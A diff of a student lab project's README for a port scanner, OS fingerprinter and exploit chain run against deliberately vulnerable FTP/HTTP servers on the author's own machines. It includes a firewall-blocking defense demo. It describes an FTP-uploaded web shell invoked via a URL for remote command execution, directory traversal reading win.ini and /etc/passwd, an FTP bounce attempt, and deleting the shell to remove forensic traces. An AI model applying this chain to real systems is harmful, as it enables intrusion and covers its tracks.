@@ -112,7 +112,7 @@ cd "e:\4-1 Course Works\portscan-os\Imp"
 
 ---
 
-### TEST 1: Full Attack Chain (Mixed Open & Closed Ports Run) ⭐
+### TEST 1: Full-Chain Multi-Stage Attack & Dynamic Exploitation (Unmitigated Run) ⭐
 *(Make sure Desktop has FTP and HTTP servers running in separate terminals, and firewall is disabled on all profiles)*
 
 ```powershell
@@ -123,38 +123,50 @@ python attacker\main.py --adapter "\Device\NPF_{A1D23BF4-3809-4F50-9ED3-9E25625D
 1. **Target MAC Resolution:** Resolves Desktop MAC (`d8:5e:d3:99:09:6c`) via ARP.
 2. **Phase 1 (SYN Scan):**
    - Port 21: `OPEN` (TTL=128, WIN=65535) — FTP server response
-   - Port 22: `CLOSED` (TTL=128, WIN=0) — Closed port TCP RST from Windows kernel
+   - Port 22: `NO RESPONSE / POSSIBLY FILTERED` (or `CLOSED` if firewall allows RST)
    - Port 80: `OPEN` (TTL=128, WIN=65535) — HTTP server response
-   - Port 81: `CLOSED` (TTL=128, WIN=0) — Closed port TCP RST from Windows kernel
+   - Port 81: `NO RESPONSE / POSSIBLY FILTERED` (or `CLOSED` if firewall allows RST)
 3. **Phase 2 (Banner Grabbing):**
-   - Automatically skips closed ports (22, 81) and queries open ports:
    - Port 21: `LabFTP Server (Vulnerable Demo) Ready`
    - Port 80: `VulnHTTP/1.0 (Lab Demo)`
 4. **Phase 3 (OS Fingerprinting):**
-   - `Candidate  : Open-Port TCP SYN/ACK` *(SYN/ACK prioritized over RST for rich TCP options)*
-   - `Likely OS  : Windows`
-   - `Version    : Windows 10 / 11 / Server 2016+` (69% tier match)
-   - `TTL        : 128 (initial 128, ~0 hop(s))`
-   - `DF bit     : set`
-   - `IP ID      : 58906` *(non-zero with DF set, characteristic of Windows/BSD)*
-   - `Options    : ('MSS', 1460)`
-5. **Phase 5 (Exploits):**
-   - `FTP Anonymous Login (port 21)` $\to$ `SUCCESS ✓` (reads root directory `pub/`)
-   - `HTTP Directory Traversal (port 80)` $\to$ `SUCCESS ✓` (8 payloads succeeded, reads `win.ini` and `README.md`)
-6. **Final Summary:**
+   - `Candidate  : Open-Port TCP SYN/ACK`
+   - `Likely OS  : Windows (62%)` (71% match to Windows 10/11/Server 2016+ tier)
+   - `TTL        : 128`, `DF bit set`, `Window: 65535`
+   - `IP ID Seq  : [27057, 27059, 27062] (STRICT_INCREMENTAL)`
+   - `Timestamp  : ~1000 Hz clock rate (Windows 1ms tick)`
+   - `ICMP/UDP   : Windows Stack (Code 0 normalized, TTL 128)`
+5. **Phase 4 (OS-Aware Payload Selection):**
+   - Target family recognized as `Windows`.
+   - Traversal targets: `windows\win.ini`, `windows\system.ini`, etc.
+   - RCE command selected: `whoami` (tailored to Windows command interpreter).
+6. **Phase 5 (Exploit Battery Execution):**
+   - `[EXPLOIT 1] FTP Anonymous Login (port 21)` $\to$ `SUCCESS ✓` (retrieves listing of `pub/`, `uploads/` via PASV).
+   - `[EXPLOIT 2] FTP Write → Web Shell → RCE (ports 21 + 80)` $\to$ `SUCCESS ✓`:
+     * Uploads sandboxed `shell.py` into `uploads/` via FTP.
+     * Invokes HTTP CGI: `http://192.168.0.116/uploads/shell.py?cmd=whoami`.
+     * Live RCE confirmation: `homed01\turjo`.
+     * Autonomous cleanup: issues FTP `DELE shell.py`, removing all forensic trace.
+   - `[EXPLOIT 3] FTP Bounce Attack (port 21)` $\to$ `FAILED ✗`:
+     * Mitigated by host security / router ALG (`WinError 10053` - `WSAECONNABORTED`).
+   - `[EXPLOIT 4] HTTP Directory Traversal (port 80)` $\to$ `SUCCESS ✓`:
+     * 3 payloads succeed (`windows\win.ini`, forward slash, URL-encoded), exfiltrating font definitions (`[fonts] Arial=arial.ttf`).
+7. **Final Summary:**
    ```text
    ═════════════════════════════════════════════════════════════════
      ATTACK SUMMARY
    ═════════════════════════════════════════════════════════════════
      Ports scanned : 4
      Open          : 2
-     Closed        : 2
-     Filtered/NR   : 0
+     Closed        : 0
+     Filtered/NR   : 2
      Banners found : 2/2
-     OS guess      : Windows (59%)
-     Exploits      : 2/2 successful
+     OS guess      : Windows (62%)
+     Exploits      : 3/4 successful
        ✓ FTP Anonymous Login (port 21)
-       ✓ HTTP Directory Traversal (port 80)
+       ✓ FTP Write -> Web Shell -> RCE (port 21)
+       ✗ FTP Bounce Attack (port 21)
+       ✓ HTTP Directory Traversal (OS-Aware) (port 80)
    ═════════════════════════════════════════════════════════════════
    ```
 
@@ -165,47 +177,92 @@ python attacker\main.py --adapter "\Device\NPF_{A1D23BF4-3809-4F50-9ED3-9E25625D
 
 ---
 
-### TEST 2: Active Defense & Firewall Auto-Blocking (Bonus Demonstration)
+### TEST 2: Active Defense Mitigation & Real-Time Attack Disruption (Bonus Demonstration)
 
-This 2-step test proves the active defense and firewall quarantine:
+This 2-phase test proves live network quarantine: the defense engine observes the scan crossing the threshold and injects a dynamic Windows Firewall rule, severing the exploit chain mid-execution.
 
-#### Step 2.1: Trigger the Block
-1. On Desktop Terminal 3, run **Scenario B** (with `--block`):
-   ```powershell
-   python defense\main.py --adapter "\Device\NPF_{439707FA-9208-4AF9-BEDE-002C5F9EE7CB}" --threshold 8 --window 10 --block
-   ```
-2. On Laptop, run the full attack:
-   ```powershell
-   python attacker\main.py --adapter "\Device\NPF_{A1D23BF4-3809-4F50-9ED3-9E25625DA229}" --target 192.168.0.116 --ports 21 22 80 443
-   ```
-3. Observe Desktop Terminal 3:
-   ```text
-   [ALERT] Possible TCP port scan from 192.168.0.105
-   [MITIGATION] Blocked TCP traffic from 192.168.0.105
-                Firewall rule: CustomPortScanBlock_192_168_0_105
-   ```
+#### Step 2.1: Run Defense Engine on Desktop
+On **Desktop Terminal 3 (Admin PowerShell)**:
+```powershell
+python defense\main.py --adapter "\Device\NPF_{439707FA-9208-4AF9-BEDE-002C5F9EE7CB}" --threshold 8 --window 10 --block
+```
 
-#### Step 2.2: Empirical Proof of Block (Re-Scan Blocked Target)
-Immediately run a quick scan on previously open ports 21 and 80 from Laptop:
+#### Step 2.2: Launch Full Attack Chain on Laptop
+On **Laptop (Admin PowerShell)**:
+```powershell
+python attacker\main.py --adapter "\Device\NPF_{A1D23BF4-3809-4F50-9ED3-9E25625DA229}" --target 192.168.0.116 --ports 21 22 80 81
+```
+
+#### Step 2.3: Live Defense Console Output (Desktop Terminal 3)
+When the threshold of SYN packets across distinct ports is breached within the 10-second window, the defense engine triggers immediately:
+```text
+SYN 192.168.0.105   -> 192.168.0.116:21    window_count=1   distinct_ports=1
+SYN 192.168.0.105   -> 192.168.0.116:22    window_count=2   distinct_ports=2
+SYN 192.168.0.105   -> 192.168.0.116:80    window_count=3   distinct_ports=3
+SYN 192.168.0.105   -> 192.168.0.116:81    window_count=4   distinct_ports=4
+...
+SYN 192.168.0.105   -> 192.168.0.116:55455 window_count=10  distinct_ports=5
+[ALERT] Possible TCP port scan from 192.168.0.105
+[MITIGATION] Blocked TCP traffic from 192.168.0.105
+             Firewall rule: CustomPortScanBlock_192_168_0_105
+```
+
+#### Step 2.4: Real-Time Exploit Chain Disruption (Laptop Output)
+Because the firewall rule drops all incoming TCP packets from `192.168.0.105`, the exploit battery is terminated mid-flight:
+```text
+  ─────────────────────────────────────────────────────────────────
+  [EXPLOIT 1] FTP Anonymous Login (port 21)
+  ─────────────────────────────────────────────────────────────────
+  Status  : SUCCESS ✓  (Completed immediately before quarantine activated)
+
+  ─────────────────────────────────────────────────────────────────
+  [EXPLOIT 2] FTP Write → Web Shell → RCE (ports 21 + HTTP)
+  ─────────────────────────────────────────────────────────────────
+  Status  : FAILED ✗
+  Detail  : Login failed: Connection failed: timed out
+    ✗ login: Connection failed: timed out
+
+  ─────────────────────────────────────────────────────────────────
+  [EXPLOIT 3] FTP Bounce Attack (port 21)
+  ─────────────────────────────────────────────────────────────────
+  Status  : FAILED ✗
+  Detail  : FTP login failed: Connection failed: timed out
+
+  ─────────────────────────────────────────────────────────────────
+  [EXPLOIT 4] HTTP Directory Traversal (port 80)
+  ─────────────────────────────────────────────────────────────────
+  Status   : FAILED ✗
+  Detail   : All 4 payloads failed (family: Windows).
+
+═════════════════════════════════════════════════════════════════
+  ATTACK SUMMARY
+═════════════════════════════════════════════════════════════════
+  Ports scanned : 4
+  Open          : 2
+  Closed        : 0
+  Filtered/NR   : 2
+  Banners found : 2/2
+  OS guess      : Windows (62%)
+  Exploits      : 1/4 successful
+    ✓ FTP Anonymous Login (port 21)
+    ✗ FTP Write -> Web Shell -> RCE (port 21)
+    ✗ FTP Bounce Attack (port 21)
+    ✗ HTTP Directory Traversal (OS-Aware) (port 80)
+═════════════════════════════════════════════════════════════════
+```
+
+#### Step 2.5: Empirical Proof of Lockdown (Immediate Re-Scan)
+Running an immediate re-scan against ports 21 and 80 from the Laptop shows complete blackout:
 ```powershell
 python attacker\main.py --adapter "\Device\NPF_{A1D23BF4-3809-4F50-9ED3-9E25625DA229}" --target 192.168.0.116 --ports 21 80
 ```
-
-#### Result: Complete Blackout
 ```text
      21  NO RESPONSE / POSSIBLY FILTERED
      80  NO RESPONSE / POSSIBLY FILTERED
 
-  [PHASE 3] OS Fingerprinting
-  No SYN/ACK was observed — OS fingerprint not available.
-
-  ATTACK SUMMARY
-  Ports scanned : 2
-  Open          : 0
-  Filtered/NR   : 2
-  Banners found : 0/0
+  ATTACK SUMMARY: 2 scanned | 0 open | 2 Filtered/NR | 0/0 Banners
 ```
-*(Ports 21 and 80 are now completely dropped by Desktop's Windows Firewall!)*
+*(All attacker packets are silently dropped by Windows Filtering Platform!)*
 
 ---
 
@@ -895,12 +952,12 @@ python -u attacker\main.py --adapter "\Device\NPF_{A1D23BF4-3809-4F50-9ED3-9E256
 ### 7.4 Multi-Step Progression Matrix Across the Entire Project
 
 ```
-Step 0 (Baseline)  ──► Step 1 (Banner 7.1) ──► Step 2 (IP ID 2)       ──► Step 3 (TSval 3)       ──► Step 4 (ECN 4)         ──► Step 5 (Flags 5)       ──► Step 6 (ICMP/UDP 6)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Windows: 60%       ──► Windows: 62%        ──► Windows: 62% (STRICT) ──► Windows: 62% (1000Hz) ──► Windows: 65% (ECN Ign)  ──► Windows: 69% (RST Open) ──► Windows: 72% (Code Norm + 328B)
-Linux: 58%         ──► Linux: 58%          ──► Linux: 60% (ALL_ZERO) ──► Linux: 56% (Timer)   ──► Linux: 55% (ECN Supp) ──► Linux: 56% (RFC Drop)  ──► Linux: 60% (Code Refl + DF=0)
-macOS/BSD: 48%     ──► macOS/BSD: 48%      ──► macOS/BSD: 53% (+5%)  ──► macOS/BSD: 59% (+6%)  ──► macOS/BSD: 57% (ECN Supp) ──► macOS/BSD: 60% (Total Drop)──► macOS/BSD: 64% (DF=1 + 28B min)
-Unit Tests: 19 PASS──► Unit Tests: 24 PASS ──► Unit Tests: 29 PASS   ──► Unit Tests: 34 PASS   ──► Unit Tests: 39 PASS     ──► Unit Tests: 44 PASS    ──► Unit Tests: 51 PASS
+Step 0 (Baseline)  ──► Step 1 (Banner 7.1) ──► Step 2 (IP ID 2)       ──► Step 3 (TSval 3)       ──► Step 4 (ECN 4)         ──► Step 5 (Flags 5)       ──► Step 6 (ICMP/UDP 6)       ──► Step 7 (Exploit 7.2 & Cross-OS)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Windows: 60%       ──► Windows: 62%        ──► Windows: 62% (STRICT) ──► Windows: 62% (1000Hz) ──► Windows: 65% (ECN Ign)  ──► Windows: 69% (RST Open) ──► Windows: 72% (Code Norm + 328B)──► Windows: 62% (win.ini + whoami)
+Linux: 58%         ──► Linux: 58%          ──► Linux: 60% (ALL_ZERO) ──► Linux: 56% (Timer)   ──► Linux: 55% (ECN Supp) ──► Linux: 56% (RFC Drop)  ──► Linux: 60% (Code Refl + DF=0) ──► Linux: 66% (/etc/passwd + id)
+macOS/BSD: 48%     ──► macOS/BSD: 48%      ──► macOS/BSD: 53% (+5%)  ──► macOS/BSD: 59% (+6%)  ──► macOS/BSD: 57% (ECN Supp) ──► macOS/BSD: 60% (Total Drop)──► macOS/BSD: 64% (DF=1 + 28B min)──► macOS/BSD: 64% (Darwin U1 / DF=1)
+Unit Tests: 19 PASS──► Unit Tests: 24 PASS ──► Unit Tests: 29 PASS   ──► Unit Tests: 34 PASS   ──► Unit Tests: 39 PASS     ──► Unit Tests: 44 PASS    ──► Unit Tests: 51 PASS          ──► Unit Tests: 63 PASS (100%)
 ```
 
 ---
@@ -908,13 +965,61 @@ Unit Tests: 19 PASS──► Unit Tests: 24 PASS ──► Unit Tests: 29 PASS  
 ### 7.5 Project Log Files Reference
 
 The following step-by-step logs document every execution run:
-- **`logs/step0.log`:** Baseline SYN scan & RST fingerprinting.
-- **`logs/step1.log`:** Idea 7.1 Banner-to-Fingerprint cross-layer correlation.
-- **`logs/step2.log`:** Idea 2 Sequential IP ID tracking (`ALL_ZERO`, `STRICT_INCREMENTAL`, `RANDOM_POSITIVE`).
-- **`logs/step3.log`:** Idea 3 TCP Timestamp clock frequency and system uptime calculation.
-- **`logs/step4.log`:** Idea 4 RFC 3168 ECN active reflection probing.
-- **`logs/step5.log`:** Idea 5 Ambiguous/Invalid TCP flags (`SYN+FIN`) "Rule-Breaker" probing.
-- **`logs/step6.log`:** Idea 6 ICMP Echo Code reflection, UDP U1 quoting length, and autonomous fallback.
-- **`logs/step6_icmp_only.log`:** Pure ICMP Echo Reply candidate runs across all three targets under stealth firewall conditions.
+- **`incremental-logs/step0.log`:** Baseline SYN scan & RST fingerprinting.
+- **`incremental-logs/step1.log`:** Idea 7.1 Banner-to-Fingerprint cross-layer correlation.
+- **`incremental-logs/step2.log`:** Idea 2 Sequential IP ID tracking (`ALL_ZERO`, `STRICT_INCREMENTAL`, `RANDOM_POSITIVE`).
+- **`incremental-logs/step3.log`:** Idea 3 TCP Timestamp clock frequency and system uptime calculation.
+- **`incremental-logs/step4.log`:** Idea 4 RFC 3168 ECN active reflection probing.
+- **`incremental-logs/step5.log`:** Idea 5 Ambiguous/Invalid TCP flags (`SYN+FIN`) "Rule-Breaker" probing.
+- **`incremental-logs/step6.log`:** Idea 6 ICMP Echo Code reflection, UDP U1 quoting length, and autonomous fallback.
+- **`incremental-logs/step6_icmp_only.log`:** Pure ICMP Echo Reply candidate runs across all three targets under stealth firewall conditions.
+- **`incremental-logs/step7.log`:** Idea 7.2 Adaptive OS-Aware Exploitation & RCE Chains across both Windows and Linux targets.
+- **`incremental-logs/full-chain.log`:** Complete 5-phase attack chain and dynamic active defense auto-quarantine demonstration against Windows Desktop.
+- **`incremental-logs/kali.log`:** Comprehensive empirical verification on Kali Linux (Debian 6.x kernel) across 5 test suites.
+
+---
+
+## 8. Cross-Platform Heterogeneous Target Verification (Windows Desktop vs Kali Linux VM) ⭐
+
+To validate true architectural cross-platform compatibility, the complete 5-phase toolkit was evaluated against two distinct physical and virtualised operating system environments: **Windows 11 Desktop** (physical LAN) and **Kali Linux VM** (VirtualBox host-only network).
+
+### 8.1 Side-by-Side Empirical Comparison Matrix
+
+| Feature / Metric | Target 1: Windows 11 Desktop | Target 2: Kali Linux VM | Technical Mechanism |
+| :--- | :--- | :--- | :--- |
+| **Target IP & Environment** | `192.168.0.116` (Physical 802.11 LAN) | `192.168.56.101` (Host-Only VirtualBox) | Real Wi-Fi vs Isolated Virtual Ethernet |
+| **Detected OS & Confidence**| **Windows (62%)** [71% Windows 11 tier] | **Linux (66%)** [100% Modern Linux tier] | Multi-layer TCP heuristics |
+| **IP ID Classification** | `STRICT_INCREMENTAL` (`[27057, 27059, ...]`) | `ALL_ZERO` (`[0, 0, 0, 0]`) | RFC 6864 Windows counter vs Linux zeroing |
+| **Initial TTL & Window** | `TTL=128`, `Window=65535` | `TTL=64`, `Window=65160` | OS TCP stack initialisation constants |
+| **TCP Option Ordering** | `['MSS', 'WSCALE', 'SACK_PERMITTED', 'TIMESTAMP']` | `['MSS', 'SACK_PERMITTED', 'TIMESTAMP', 'WSCALE']` | OS-specific TCP header option builder |
+| **Cross-Layer Banners** | `VulnHTTP/1.0`, `LabFTP Server` | `OpenSSH Debian-5`, `VulnHTTP`, `LabFTP` | Layer 7 banner keyword mapping |
+| **Phase 4 Traversal Selection**| `windows\win.ini`, `windows\system.ini` | `/etc/passwd`, `/etc/passwd (bypass)` | Dynamic OS-Aware Payload Selector |
+| **Phase 4 RCE Command** | `whoami` | `id` | Windows CMD vs Unix POSIX command |
+| **Live RCE Output** | `homed01\turjo` | `uid=0(root) gid=0(root)` | Real command execution proof via web shell |
+| **Autonomous Cleanup** | `DELE shell.py` $\to$ File removed | `DELE shell.py` $\to$ File removed | Guaranteed zero residual footprint |
+| **FTP Bounce Mitigation** | FAILED ✗ (`WinError 10053`) | FAILED ✗ (`WinError 10053`) | WFP / ALG outbound PORT abort |
+| **Exploit Success Rate** | **3/4 Successful (75%)** | **3/4 Successful (75%)** | Exploit 1, 2, and 4 succeed on both |
+
+---
+
+### 8.2 Architectural Highlights & Key Findings
+
+#### 1. Dynamic Reconnaissance-to-Exploitation Adaptation (Phase 4):
+* When scanning **Windows Desktop**, the engine detects Windows (62%), switches traversal payloads to `c:\windows\win.ini`, and triggers `whoami` via the web shell, exfiltrating the font configuration and revealing the active user `homed01\turjo`.
+* When scanning **Kali Linux**, the engine detects Linux (66%), switches traversal payloads to `/etc/passwd`, and triggers `id` via the web shell, exfiltrating the Unix user accounts and revealing `uid=0(root) gid=0(root)`.
+* **Zero Hardcoding:** The exploit suite never assumes the target platform in advance; all vectors are adapted dynamically based on Phase 3 fingerprinting.
+
+#### 2. Multi-Stage Protocol Chaining & Safe Execution:
+* **Protocol Synthesis:** The attack bridges Layer 7 FTP (Port 21) write capabilities with Layer 7 HTTP (Port 80) CGI script invocation.
+* **Sandbox Boundaries:** The uploaded `shell.py` web shell enforces a strict read-only command whitelist (`whoami`, `hostname`, `dir`, `pwd`, `ver`, `id`, `test`), rejecting arbitrary or destructive input.
+* **Autonomous Cleanup:** Immediately following HTTP verification and RCE execution, the toolkit sends an FTP `DELE shell.py` command, verified by both Windows and Kali server logs, ensuring no forensic debris remains on the victim machine.
+
+#### 3. Host OS & Network-Level Mitigation Proof:
+* Across both Windows and Linux victim environments, **Exploit 3 (FTP Bounce)** was actively prevented with `[WinError 10053] (WSAECONNABORTED)`.
+* This provides empirical evidence of defense-in-depth: the Windows host network stack (Windows Filtering Platform) and router Application Layer Gateways (ALGs) monitor FTP control connections and automatically terminate any session attempting to inject a `PORT` command targeting a third-party IP address.
+
+#### 4. Rigorous Unit Test Validation:
+* The test suite in `Imp/tests/test_exploits.py` validates all safety mechanisms across **12 new unit tests** (payload mapping, web shell sandboxing, whitelist enforcement, RFC 1918 private IP constraints, and server boundary confinement).
+* **Overall Project Test Health:** **63/63 automated unit tests PASSING** in 0.12s.
 
 
